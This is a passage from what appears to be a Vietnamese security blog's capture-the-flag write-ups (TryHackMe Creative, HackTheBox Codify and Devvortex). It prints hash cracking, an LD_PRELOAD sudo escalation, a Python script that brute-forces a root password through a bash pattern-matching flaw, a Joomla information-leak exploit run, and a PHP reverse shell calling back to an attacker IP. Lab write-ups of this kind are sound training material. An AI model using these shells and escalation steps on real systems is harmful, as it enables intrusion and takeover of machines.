2 (iteration count) is 16 for all loaded hashes Will run 6 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status sweetness (id_rsa) 1g 0:00:00:26 DONE (2024-04-14 14:02) 0.03818g/s 36.65p/s 36.65c/s 36.65C/s 242424..marie1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh -i id_rsa saad@10.10.55.1 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 14 Apr 2024 06:03:58 PM UTC System load: 0.0 Processes: 115 Usage of /: 57.5% of 8.02GB Users logged in: 0 Memory usage: 27% IPv4 address for eth0: 10.10.55.1 Swap usage: 0% 58 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Nov 6 07:56:40 2023 from 192.168.8.102 saad@m4lware:~$ id uid=1000(saad) gid=1000(saad) groups=1000(saad) saad@m4lware:~$ saad@m4lware:~$ ls -la total 52 drwxr-xr-x 7 saad saad 4096 Jan 21 2023 . drwxr-xr-x 3 root root 4096 Jan 20 2023 .. -rw------- 1 saad saad 362 Jan 21 2023 .bash_history -rw-r--r-- 1 saad saad 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 saad saad 3797 Jan 21 2023 .bashrc drwx------ 2 saad saad 4096 Jan 20 2023 .cache drwx------ 3 saad saad 4096 Jan 20 2023 .gnupg drwxrwxr-x 3 saad saad 4096 Jan 20 2023 .local -rw-r--r-- 1 saad saad 807 Feb 25 2020 .profile drwx------ 3 saad saad 4096 Jan 20 2023 snap drwx------ 2 saad saad 4096 Jan 21 2023 .ssh -rwxr-xr-x 1 root root 150 Jan 20 2023 start_server.py -rw-r--r-- 1 saad saad 0 Jan 20 2023 .sudo_as_admin_successful -rw-rw---- 1 saad saad 33 Jan 21 2023 user.txt Privilege escalation # Sau khi tÃ¬m loanh quanh user nÃ y, tÃ´i cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p á»Ÿ .bash_history\nsaad@m4lware:~$ cat .bash_history whoami pwd ls -al ls cd .. sudo -l echo \u0026#34;saad:******************$4291\u0026#34; \u0026gt; creds.txt rm creds.txt sudo -l whomai whoami pwd ls -al sudo -l ls -al pwd whoami mysql -u root -p netstat -antlp mysql -u root sudo su ssh root@192.169.155.104 mysql -u user -p mysql -u db_user -p ls -ld /var/lib/mysql ls -al cat .bash_history cat .bash_logout nano .bashrc ls -al Sá»­ dá»¥ng nÃ³ Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c thÃ´ng tin khÃ¡c\nsaad@m4lware:~$ sudo -l [sudo] password for saad: Matching Defaults entries for saad on m4lware: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD User saad may run the following commands on m4lware: (root) /usr/bin/ping Äá»ƒ Ã½ vÃ o pháº§n env_keep+=LD_PRELOAD, tÃ¬m kiáº¿m vá» LD_PRELOAD privilege escalation, tÃ´i tÃ¬m tháº¥y hÆ°á»›ng dáº«n ngay á»Ÿ link Ä‘áº§u tiÃªn.\nLÃ m theo hÆ°á»›ng dáº«n vÃ  tÃ´i cÃ³ root\nsaad@m4lware:~$ cd /tmp/ saad@m4lware:/tmp$ nano shell.c saad@m4lware:/tmp$ gcc -shared -fPIC -o shell.so shell.c -nostartfiles saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping bash: fork: Resource temporarily unavailable root@m4lware:/tmp# id bash: fork: retry: Resource temporarily unavailable root@m4lware:/tmp# exit exit sh: 1: Cannot fork /usr/bin/lesspipe: 28: Cannot fork root@m4lware:/tmp# id uid=0(root) gid=0(root) groups=0(root) root@m4lware:/tmp# cd /root root@m4lware:~# ls -la total 44 drwx------ 5 root root 4096 Nov 6 07:56 . drwxr-xr-x 19 root root 4096 Dec 3 2022 .. -rw------- 1 root root 48 Apr 14 18:57 .bash_history -rw-r--r-- 1 root root 3132 Jan 21 2023 .bashrc drwxr-xr-x 3 root root 4096 Jan 20 2023 .cache drwxr-xr-x 3 root root 4096 Jan 20 2023 .local -rw------- 1 root root 1 Jan 21 2023 .mysql_history -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw------- 1 root root 1 Jan 21 2023 .python_history -rw------- 1 root root 33 Jan 21 2023 root.txt drwx------ 3 root root 4096 Jan 20 2023 snap root@m4lware:~# ","date":"14 April 2024","externalUrl":null,"permalink":"/ctf/tryhackme/creative/","section":"Ctf","summary":"","title":"Tryhackme - Creative","type":"ctf"},{"content":"Codify lÃ  má»™t machine má»©c Ä‘á»™ easy dá»±a trÃªn lá»— há»•ng cá»§a thÆ° viá»‡n trong Node.js Ä‘á»ƒ thá»±c hiá»‡n RCE, cÅ©ng nhÆ° lá»£i dá»¥ng cÃ¡c lá»— há»•ng trong bash Ä‘á»ƒ thá»±c hiá»‡n leo thang Ä‘áº·c quyá»n lÃªn root\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk= | 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi 80/tcp open http syn-ack Apache httpd 2.4.52 |_http-title: Codify |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 3000/tcp open http syn-ack Node.js Express framework | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain codify.htb vÃ o file hosts.\nsudo nano /etc/hosts\n127.0.0.1 localhost 127.0.1.1 4nhHT. 4nhHT 10.10.11.239 codify.htb # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters Enumeration # Truy cáº­p web vá»›i port 3000. Sau khi kiá»ƒm tra má»™t lÆ°á»£t cÃ¡c page cá»§a web nÃ y, tÃ´i tÃ¬m tháº¥y pháº§n cÃ³ thá»ƒ khai thÃ¡c á»Ÿ Ä‘Ã¢y\nThá»­ truy cáº­p vÃ o link vm2, tÃ´i Ä‘Æ°á»£c vm2 phiÃªn báº£n 3.9.16. TÃ¬m kiáº¿m phiÃªn báº£n nÃ y trÃªn internet, tÃ´i tÃ¬m tháº¥y CVE-2023-30547. Theo cÃ¡c bÆ°á»›c cá»§a PoC\nThá»­ thay tháº¿ payload Ä‘á»ƒ láº¥y RCE\nUser Flag # TÃ¬m kiáº¿m xoay quanh cÃ¡c file thÆ° má»¥c trong /var/www/, tÃ´i tÃ¬m tháº¥y 1 file db\nsvc@codify:~$ ls -la /var/www/contact ls -la /var/www/contact total 120 drwxr-xr-x 3 svc svc 4096 Sep 12 2023 . drwxr-xr-x 5 root root 4096 Sep 12 2023 .. -rw-rw-r-- 1 svc svc 4377 Apr 19 2023 index.js -rw-rw-r-- 1 svc svc 268 Apr 19 2023 package.json -rw-rw-r-- 1 svc svc 77131 Apr 19 2023 package-lock.json drwxrwxr-x 2 svc svc 4096 Apr 21 2023 templates -rw-r--r-- 1 svc svc 20480 Sep 12 2023 tickets.db svc@codify:~$ cat /var/www/contact/tickets.db cat /var/www/contact/tickets.db ï¿½T5ï¿½ï¿½Tï¿½format 3@ .WJ otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)ï¿½ï¿½ tableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT ï¿½ï¿½Gï¿½joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ************************ ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ua users ickets r]rï¿½h%%ï¿½Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.openï¿½ ;ï¿½wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open svc@codify:~$ TÃ´i cÃ³ user joshua vÃ  password hash cá»§a user nÃ y. Sao chÃ©p nÃ³ vá» vÃ  crack báº±ng john\nâ”Œâ”€â”€(neoã‰¿4nhHT)-[~/HTB-Codify] â””â”€$ john -w=/usr/share/wordlists/rockyou.txt hash.txt Created directory: /home/neo/.john Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 4096 for all loaded hashes Will run 20 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ********** (?) 1g 0:00:00:19 DONE (2024-03-24 22:09) 0.05122g/s 73.77p/s 73.77c/s 73.77C/s scotty..michel Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Login SSH báº±ng user joshua\nâ”Œâ”€â”€(neoã‰¿4nhHT)-[~/HTB-Codify] â””â”€$ ssh joshua@10.10.11.239 The authenticity of host \u0026#39;10.10.11.239 (10.10.11.239)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.239\u0026#39; (ED25519) to the list of known hosts. joshua@10.10.11.239\u0026#39;s password: joshua@codify:~$ id uid=1000(joshua) gid=1000(joshua) groups=1000(joshua) joshua@codify:~$ ls python.py script.py user.txt joshua@codify:~$ Privilege Escalation # sudo -l\njoshua@codify:~$ sudo -l [sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh joshua@codify:~$ cat /opt/scripts/mysql-backup.sh #!/bin/bash DB_USER=\u0026#34;root\u0026#34; DB_PASS=$(/usr/bin/cat /root/.creds) BACKUP_DIR=\u0026#34;/var/backups/mysql\u0026#34; read -s -p \u0026#34;Enter MySQL password for $DB_USER: \u0026#34; USER_PASS /usr/bin/echo if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \u0026#34;Password confirmed!\u0026#34; else /usr/bin/echo \u0026#34;Password confirmation failed!\u0026#34; exit 1 fi /usr/bin/mkdir -p \u0026#34;$BACKUP_DIR\u0026#34; databases=$(/usr/bin/mysql -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; -e \u0026#34;SHOW DATABASES;\u0026#34; | /usr/bin/grep -Ev \u0026#34;(Database|information_schema|performance_schema)\u0026#34;) for db in $databases; do /usr/bin/echo \u0026#34;Backing up database: $db\u0026#34; /usr/bin/mysqldump --force -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; \u0026#34;$db\u0026#34; | /usr/bin/gzip \u0026gt; \u0026#34;$BACKUP_DIR/$db.sql.gz\u0026#34; done /usr/bin/echo \u0026#34;All databases backed up successfully!\u0026#34; /usr/bin/echo \u0026#34;Changing the permissions\u0026#34; /usr/bin/chown root:sys-adm \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/chmod 774 -R \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/echo \u0026#39;Done!\u0026#39; joshua@codify:~$ PhÃ¢n tÃ­ch file bash nÃ y vÃ  tÃ¬m hiá»ƒu thÃ´ng tin trÃªn internet, tÃ´i tÃ¬m tháº¥y lá»— há»•ng trong viá»‡c so sÃ¡nh DB_PASS vÃ  USER_PASS, Ä‘Æ°á»£c gá»i lÃ  unquoted variable comparison, nÃ³ liÃªn quan Ä‘áº¿n 2 dáº¥u báº±ng ==.\nHIá»ƒu Ä‘Æ¡n giáº£n lÃ  trong bash, náº¿u phÃ­a bÃªn pháº£i cá»§a dáº¥u == khÃ´ng Ä‘Æ°á»£c trÃ­ch dáº«n trá»±c tiáº¿p, bash sáº½ thá»±c hiá»‡n khá»›p máº«u thay vÃ¬ so sÃ¡nh chuá»—i. Trong trÆ°á»ng há»£p nÃ y, chÃºng ta cÃ³ thá»ƒ khá»›p báº¥t ká»³ kÃ½ tá»± nÃ o mÃ  Ä‘Æ°á»£c theo sau bá»Ÿi má»™t sá»‘ lÆ°á»£ng kÃ½ tá»± nÃ o Ä‘Ã³, vÃ­ dá»¥ a******, AB*****\nÃp dá»¥ng lá»—i nÃ y, tÃ´i sáº½ viáº¿t má»™t Ä‘oáº¡n mÃ£ python Ä‘Æ¡n giáº£n Ä‘á»ƒ kiá»ƒm tra máº­t kháº©u, vá»›i logic Ä‘Æ¡n giáº£n lÃ  thá»­ tá»«ng kÃ½ tá»± má»™t trong chuá»—i password vÃ  theo sau bá»Ÿi má»™t sá»‘ lÆ°á»£ng kÃ½ tá»± báº¥t ká»³ nÃ o Ä‘Ã³.\nimport string import os chars = string.ascii_letters + string.digits password=\u0026#39;\u0026#39; next=1 while next==1: for i in chars: errorlevel=os.system(\u0026#34;echo \u0026#34;+password+i+\u0026#34;* | sudo /opt/scripts/mysql-backup.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;) if errorlevel==0: password=password+i print(\u0026#34;[+] new character found: \u0026#34;+password) next=1 break else: next=0 print(\u0026#34;[+] done, root password is: \u0026#34;+password) Táº¡o 1 file exploit.py trÃªn mÃ¡y codify, sao chÃ©p Ä‘oáº¡n code trÃªn vÃ  lÆ°u Ä‘á»ƒ cháº¡y\njoshua@codify:~$ nano exploit.py joshua@codify:~$ python3 exploit.py [sudo] password for joshua: [+] new character found: k [+] new character found: kl [+] new character found: klj [+] new character found: kljh [+] new character found: kljh1 [+] new character found: kljh12 [+] new character found: kljh12k [+] new character found: kljh12k3 [+] new character found: kljh12k3j [+] new character found: kljh12k3jh [+] new character found: kljh12k3jha [+] new character found: kljh12k3jhas [+] new character found: kljh12k3jhask [+] new character found: kljh12k3jhaskj [+] new character found: kljh12k3jhaskjh [+] new character found: kljh12k3jhaskjh1 [+] new character found: kljh12k3jhaskjh12 [+] new character found: kljh12k3jhaskjh12k [+] new character found: ******************* [+] new character found: ******************** [+] new character found: ********************* [+] done, root password is: ********************** joshua@codify:~$ Login vÃ o root\njoshua@codify:~$ su root Password: root@codify:/home/joshua# id uid=0(root) gid=0(root) groups=0(root) root@codify:/home/joshua# ls /root root.txt scripts root@codify:/home/joshua# ","date":"17 March 2024","externalUrl":null,"permalink":"/ctf/hackthebox/codify/","section":"Ctf","summary":"","title":"HackTheBox - Codify","type":"ctf"},{"content":"","date":"17 March 2024","externalUrl":null,"permalink":"/tags/nodejs/","section":"Tags","summary":"","title":"Nodejs","type":"tags"},{"content":"","date":"17 March 2024","externalUrl":null,"permalink":"/tags/shell-script/","section":"Tags","summary":"","title":"Shell Script","type":"tags"},{"content":"","date":"17 March 2024","externalUrl":null,"permalink":"/tags/vm2-library/","section":"Tags","summary":"","title":"Vm2 Library","type":"tags"},{"content":"","date":"10 March 2024","externalUrl":null,"permalink":"/tags/apport-cli/","section":"Tags","summary":"","title":"Apport-Cli","type":"tags"},{"content":"Devvortex lÃ  má»™t machine Ä‘Æ¡n giáº£n xoay quanh ká»¹ thuáº­t Ã¡p dá»¥ng cÃ¡c lá»— há»•ng Ä‘Ã£ cÃ³ PoC Ä‘á»ƒ táº£i RCE lÃªn Joomla CMS, láº¥y user password trong mysql vÃ  nÃ¢ng cao Ä‘áº·c quyá»n vá»›i apport-cli\nReconnaissance and Scanning # PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://devvortex.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm devvortex.htb vÃ o /etc/hosts Ä‘á»ƒ phÃ¢n giáº£i tÃªn miá»n vá»›i IP 10.10.11.242\nnano /etc/hosts\n10.10.11.242 devvortex.htb\nTruy cáº­p http://devvortex.htb vÃ  thá»­ cÃ¡c cÃ¡ch Ä‘Æ¡n giáº£n Ä‘á»ƒ thu tháº­p cÃ¡c thÃ´ng tin cÆ¡ báº£n cá»§a web server nÃ y nhÆ°: robots.txt, index.php, v.v\u0026hellip;. Tuy nhiÃªn khÃ´ng cÃ³ káº¿t quáº£ nÃ o Ä‘Ã¡ng giÃ¡, nÃªn tÃ´i sáº½ thá»­ tÃ¬m kiáº¿m sub domain vÃ¬ viá»‡c cung cáº¥p domain háº³n pháº£i cÃ³ lÃ½ do nÃ o Ä‘Ã³.\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/neo] â””â”€# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H \u0026#34;Host: FUZZ.devvortex.htb\u0026#34; -fs 154 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://devvortex.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.devvortex.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 154 ________________________________________________ dev [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 122ms] ThÃªm subdomain vÃ o file hosts\nnano /etc/hosts\n10.10.11.242 devvortex.htb dev.devvotex.htb\nTruy cáº­p http://dev.devvotex.htb. Sá»­ dá»¥ng Wappalyzer Ä‘á»ƒ check cÃ¡c thÃ nh pháº§n cáº¥u táº¡o nÃªn web nÃ y.\nEnumeration # Kiá»ƒm tra phiÃªn báº£n cá»§a Joomla\nTÃ¬m kiáº¿m cÃ¡c lá»— há»•ng Joomla phiÃªn báº£n 4.2.6, tÃ´i tÃ¬m tháº¥y CVE-2023-23752, thá»­ git clone nÃ³ vá» vÃ  cháº¡y\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/neo] â””â”€# ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: ****************** DB name: joomla DB prefix: sd4fg_ DB encryption 0 Váº­y lÃ  tÃ´i vá»«a biáº¿t Ä‘Æ°á»£c trong server cÃ³ 2 user lÃ  lewis vÃ  logan, vá»«a cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p cá»§a lewis\nTruy cáº­p http://dev.devvortex.htb/administrator/ Ä‘á»ƒ Ä‘Äƒng nháº­p vá»›i user lewis\nÄá»ƒ táº¡o Ä‘Æ°á»£c RCE, cÃ³ thá»ƒ thÃªm reverse shell vÃ o má»™t trong cÃ¡c file php cá»§a template\nSystem -\u0026gt; Site templates -\u0026gt; Cassiopeia Details and Files, chá»n má»™t trong sá»‘ cÃ¡c file cÃ³ sáºµn vÃ  sá»­a ná»™i dung thÃ nh reverse shell cá»§a mÃ¬nh. TÃ´i chá»n shell bÃªn dÆ°á»›i:\nexec(\u0026quot;/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/9001 0\u0026gt;\u0026amp;1'\u0026quot;);\nBáº­t nc: nc -lnvp 9001\nLÆ°u file vÃ  truy cáº­p Ä‘Æ°á»ng dáº«n Ä‘áº¿n file vá»«a thay Ä‘á»•i\nhttp://dev.devvortex.htb/templates/cassiopeia/error.php\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/HTB/Devvortex] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.77] from (UNKNOWN) [10.10.11.242] 60634 bash: cannot set terminal process group (855): Inappropriate ioctl for device bash: no job control in this shell www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ User Flag # Quay láº¡i cÃ¡c thÃ´ng tin ban Ä‘áº§u, tÃ´i cÃ³ Ä‘Æ°á»£c má»™t thÃ´ng tin Ä‘Äƒng nháº­p dá»±a trÃªn mysql. Váº­y thÃ¬ tÃ´i sáº½ thá»­ Ä‘Äƒng nháº­p vÃ o mysql trÃªn shell nÃ y.\nwww-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ mysql -h localhost -u lewis -p \u0026lt;emplates/cassiopeia$ mysql -h localhost -u lewis -p Enter password: .... ```python mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | joomla | | performance_schema | +--------------------+ 3 rows in set (0.00 sec) mysql\u0026gt; use joomla; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; select username,password from sd4fg_users; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | | logan | ---------------------------------------------------/yBtkIj12 | +----------+--------------------------------------------------------------+ 2 rows in set (0.00 sec) Váº­y lÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c password hash cá»§a logan á»Ÿ Ä‘Ã¢y. Sao chÃ©p hash nÃ y vá» mÃ¡y vÃ  sá»­ dá»¥ng john Ä‘á»ƒ crack nÃ³\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/HTB/Devvortex] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ************* (?) 1g 0:00:00:08 DONE (2024-03-17 11:30) 0.1239g/s 178.4p/s 178.4c/s 178.4C/s lacoste..michel Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. SSH login\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/HTB/Devvortex] â””â”€# ssh logan@10.10.11.242 logan@10.10.11.242\u0026#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 17 Mar 2024 03:29:10 PM UTC System load: 0.0 Processes: 197 Usage of /: 67.7% of 4.76GB Users logged in: 0 Memory usage: 24% IPv4 address for eth0: 10.10.11.242 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 17 09:12:48 2024 from 10.10.14.25 logan@devvortex:~$ id uid=1000(logan) gid=1000(logan) groups=1000(logan) logan@devvortex:~$ ls final getroot new user.txt logan@devvortex:~$ Privilege Escalation # logan@devvortex:~$ sudo -l [sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli apport lÃ  má»™t service trong ubuntu dÃ¹ng Ä‘á»ƒ thu tháº­p cÃ¡c thÃ´ng tin vá» há»‡ thá»‘ng, chi tiáº¿t Ä‘á»c thÃªm á»Ÿ Ä‘Ã¢y. Kiá»ƒm tra phiÃªn báº£n cá»§a apport-cli nÃ y\nlogan@devvortex:~$ /usr/bin/apport-cli -v 2.20.11 Sau khi tÃ¬m kiáº¿m cÃ¡c lá»— há»•ng vá» apport-cli 2.20.11 trÃªn máº¡ng, tÃ´i tÃ¬m Ä‘Æ°á»£c CVE-2023-1326\nÄáº§u tiÃªn tÃ´i sáº½ táº¡o má»™t file crash\nlogan@devvortex:~$ sleep 30 \u0026amp; [1] 5471 logan@devvortex:~$ killall -SIGSEGV sleep logan@devvortex:~$ cd /var/crash/ [1]+ Segmentation fault (core dumped) sleep 30 (wd: ~) (wd now: /var/crash) logan@devvortex:/var/crash$ ll total 40 drwxrwxrwt 2 root root 4096 Mar 17 15:50 ./ drwxr-xr-x 13 root root 4096 Sep 12 2023 ../ -rw-rw-r-- 1 logan logan 0 Mar 17 14:04 some_crash_file.crash -rw-r----- 1 logan logan 30238 Mar 17 15:50 _usr_bin_sleep.1000.crash logan@devvortex:/var/crash$ Cháº¡y tiáº¿n trÃ¬nh apport-cli vá»›i option -c Ä‘á»ƒ táº¡o report\nlogan@devvortex:/var/crash$ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash *** Send problem report to the developers? After the problem report has been sent, please fill out the form in the automatically opened web browser. What would you like to do? Your options are: S: Send report (29.9 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: Cancel Please choose (S/V/K/I/C): V *** Collecting problem information The collected information can be sent to the developers to improve the application. This might take a few minutes. Nháº­p !/bin/bash Ä‘á»ƒ láº¥y shell tá»« process nÃ y\n................................ERROR: Cannot update /var/crash/_usr_bin_sleep.1000.crash: [Errno 13] Permission denied: \u0026#39;/var/crash/_usr_bin_sleep.1000.crash\u0026#39; ........................... root@devvortex:/var/crash# root@devvortex:/var/crash# id uid=0(root) gid=0(root) groups=0(root) root@devvortex:/var/crash# ls -la /root total 40 drwx------ 6 root root 4096 Mar 17 09:43 . drwxr-xr-x 19 root root 4096 Oct 26 15:12 .. lrwxrwxrwx 1 root root 9 Jan 20 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 Feb 26 14:30 .cache drwxr-xr-x 3 root root 4096 Oct 29 16:21 .cleanup -rw------- 1 root root 38 Mar 17 09:43 .lesshst drwxr-xr-x 3 root root 4096 Feb 26 14:30 .local -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r----- 1 root root 33 Mar 17 06:39 root.txt drwx------ 2 root root 4096 Oct 26 15:12 .ssh root@devvortex:/var/crash# ","date":"10 March 2024","externalUrl":null,"permalink":"/ctf/hackthebox/devvortex/","section":"Ctf","summary":"","title":"HackTheBox - Devvortex","type":"ctf"},{"content":"","date":"7 October 2023","externalUrl":null,"permalink":"/tags/gtfobins/","section":"Tags","summary":"","title":"Gtfobins","type":"tags"},{"content":"","date":"7 October 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8= | 256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to 